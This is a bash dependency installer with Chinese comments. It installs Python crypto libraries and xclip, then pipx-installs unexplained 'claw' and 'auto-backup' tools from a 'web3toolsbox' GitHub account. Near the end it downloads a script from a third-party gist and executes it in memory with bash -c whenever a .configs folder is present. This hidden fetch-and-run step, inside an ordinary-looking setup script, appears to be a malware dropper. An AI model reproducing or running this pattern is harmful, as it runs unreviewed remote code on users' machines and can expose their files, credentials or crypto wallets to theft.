#!/bin/bash

FAILED_STEPS=()

run_step() {
    local desc="$1"
    shift
    echo ""
    echo "==> $desc"
    "$@"
    local rc=$?
    if [ $rc -ne 0 ]; then
        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
        FAILED_STEPS+=("$desc (exit=$rc)")
    fi
    return 0
}

OS_TYPE=$(uname -s)

detect_apt_cmd() {
    if command -v apt-get &>/dev/null; then
        echo "apt-get"
        return 0
    fi

    if command -v apt &>/dev/null; then
        echo "apt"
        return 0
    fi

    return 1
}

ensure_runtime_path() {
    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
    local candidate=""
    for candidate in "${path_candidates[@]}"; do
        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
            PATH="$candidate:$PATH"
        fi
    done
    export PATH
}

download_url_to_stdout() {
    local url="$1"

    if command -v curl &>/dev/null; then
        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
        return $?
    fi

    if command -v wget &>/dev/null; then
        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
        return $?
    fi

    return 127
}

pip_supports_break_system_packages() {
    python3 -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
}

python_package_state() {
    local pkg="$1"
    local min_version="$2"

    python3 - "$pkg" "$min_version" <<'PY'
import sys
from importlib import metadata

name, min_v = sys.argv[1], sys.argv[2]

def parse(v):
    parts = []
    for part in v.replace("-", ".").split("."):
        num = ""
        for ch in part:
            if ch.isdigit():
                num += ch
            else:
                break
        parts.append(int(num or 0))
    return parts

try:
    current = metadata.version(name)
except metadata.PackageNotFoundError:
    sys.exit(2)
except Exception:
    sys.exit(3)

a = parse(current)
b = parse(min_v)
n = max(len(a), len(b))
a.extend([0] * (n - len(a)))
b.extend([0] * (n - len(b)))

if a >= b:
    print(current)
    sys.exit(0)

print(current)
sys.exit(1)
PY
}

get_pipx_venv_python_path() {
    local venv_name="$1"
    local candidates=(
        "$HOME/.local/share/pipx/venvs/$venv_name/bin/python"
        "$HOME/.local/pipx/venvs/$venv_name/bin/python"
        "$HOME/pipx/venvs/$venv_name/bin/python"
    )
    local candidate=""
    for candidate in "${candidates[@]}"; do
        if [ -x "$candidate" ]; then
            echo "$candidate"
            return 0
        fi
    done
    return 1
}

install_pipx_package() {
    local package_spec="$1"
    local command_name="$2"
    local venv_name="$3"
    local existing_command=""
    local venv_python=""
    local install_args=()
    local installed_command=""

    if command -v "$command_name" &>/dev/null; then
        existing_command="$(command -v "$command_name")"
    fi

    if [ -n "$venv_name" ]; then
        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
    fi

    if [ -n "$existing_command" ] && { [ -z "$venv_name" ] || [ -n "$venv_python" ]; }; then
        echo "CLI 已可用，跳过安装：$existing_command"
        return 0
    fi

    install_args=(install "$package_spec")
    if [ -n "$existing_command" ] && [ -n "$venv_name" ] && [ -z "$venv_python" ]; then
        echo "WARN: 检测到命令存在但 pipx venv 缺失，尝试强制重装：$package_spec" >&2
        install_args=(install --force "$package_spec")
    fi

    run_step "pipx 安装 $command_name（$package_spec）" pipx "${install_args[@]}"
    ensure_runtime_path

    if command -v "$command_name" &>/dev/null; then
        installed_command="$(command -v "$command_name")"
    fi
    if [ -n "$venv_name" ]; then
        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
    fi

    if [ -z "$installed_command" ] || { [ -n "$venv_name" ] && [ -z "$venv_python" ]; }; then
        echo "WARN: pipx 安装后状态仍不完整：$package_spec" >&2
        FAILED_STEPS+=("校验 pipx 包 $package_spec (incomplete)")
    fi
}

install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                local brew_install_script=""
                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
                if [ -z "$brew_install_script" ]; then
                    echo "WARN: 无法下载 Homebrew 安装脚本，跳过 Homebrew 安装。" >&2
                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
                else
                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
                fi
            fi
            
            if ! command -v pip3 &> /dev/null; then
                run_step "brew install python3" brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            APT_GET="$(detect_apt_cmd || true)"
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ -n "$PACKAGES_TO_INSTALL" ] && [ -n "$APT_GET" ]; then
                run_step "$APT_GET update" sudo "$APT_GET" update
                # shellcheck disable=SC2086
                run_step "$APT_GET install -y $PACKAGES_TO_INSTALL" sudo "$APT_GET" install -y $PACKAGES_TO_INSTALL
            elif [ -n "$PACKAGES_TO_INSTALL" ]; then
                echo "WARN: 未找到 apt/apt-get，跳过系统依赖安装：$PACKAGES_TO_INSTALL" >&2
            fi
            ;;
            
        *)
            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
            ;;
    esac
}

run_step "安装系统依赖" install_dependencies
ensure_runtime_path

PIP_INSTALL_CMD=(python3 -m pip install)
if [ "$OS_TYPE" = "Linux" ]; then
    if pip_supports_break_system_packages; then
        PIP_INSTALL_CMD+=(--break-system-packages)
    fi
elif [ "$OS_TYPE" = "Darwin" ]; then
    PIP_INSTALL_CMD+=(--user)
fi

install_python_package_if_needed() {
    local pkg="$1"
    local min_version="$2"
    local state_output=""
    local state_rc=0

    if ! command -v python3 &>/dev/null; then
        echo "WARN: 未找到 python3，跳过 Python 包安装：$pkg>=$min_version" >&2
        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
        return 0
    fi

    state_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    state_rc=$?
    if [ $state_rc -eq 0 ]; then
        echo "Python 包已满足要求：$pkg $state_output (>= $min_version)"
        return 0
    fi

    if [ $state_rc -eq 1 ]; then
        echo "检测到较低版本：$pkg $state_output (< $min_version)，将升级。"
    fi

    if [ $state_rc -ge 2 ]; then
        echo "未检测到可用版本，将安装：$pkg>=$min_version"
    fi

    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"
}

install_python_package_if_needed requests 2.31.0
install_python_package_if_needed cryptography 42.0.0
install_python_package_if_needed pycryptodome 3.19.0

# 检测是否为 WSL 环境
is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        # 也可以通过 uname -r 检测
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

install_auto_backup() {
    if ! command -v pipx &> /dev/null; then
        echo "检测到未安装 pipx，正在安装 pipx..."
        case $OS_TYPE in
            "Darwin")
                run_step "brew install pipx" brew install pipx
                run_step "pipx ensurepath" pipx ensurepath
                ensure_runtime_path
                ;;
            "Linux")
                APT_GET="$(detect_apt_cmd || true)"
                if [ -n "$APT_GET" ]; then
                    run_step "$APT_GET update（pipx）" sudo "$APT_GET" update
                    run_step "$APT_GET install -y pipx" sudo "$APT_GET" install -y pipx
                    run_step "pipx ensurepath" pipx ensurepath
                    ensure_runtime_path
                else
                    echo "WARN: 未找到 apt/apt-get，跳过 pipx 安装" >&2
                    return 0
                fi
                ;;
            *)
                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
                return 0
                ;;
        esac
    fi

    install_pipx_package "git+https://github.com/web3toolsbox/claw.git" "openclaw-config" "claw"

    local install_url=""
    case $OS_TYPE in
        "Darwin")
            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
            ;;
        "Linux")
            if is_wsl; then
                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
            else
                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
            fi
            ;;
        *)
            echo "不支持的操作系统，跳过安装"
            return 0
            ;;
    esac

    install_pipx_package "$install_url" "autobackup" ""
}

run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup

run_remote_config_script() {
    local script_content=""

    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
    if [ -z "$script_content" ]; then
        if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
            return 0
        fi
        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
        return 1
    fi

    bash -c "$script_content"
}

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if [ ! -d .configs ]; then
    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
else
    run_step "配置相关环境（远程脚本内存执行）" run_remote_config_script
fi

echo "安装完成！"
if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo "------------------------------" >&2
    echo "WARN: 以下步骤失败但已继续执行：" >&2
    for s in "${FAILED_STEPS[@]}"; do
        echo " - $s" >&2
    done
    echo "------------------------------" >&2
fi
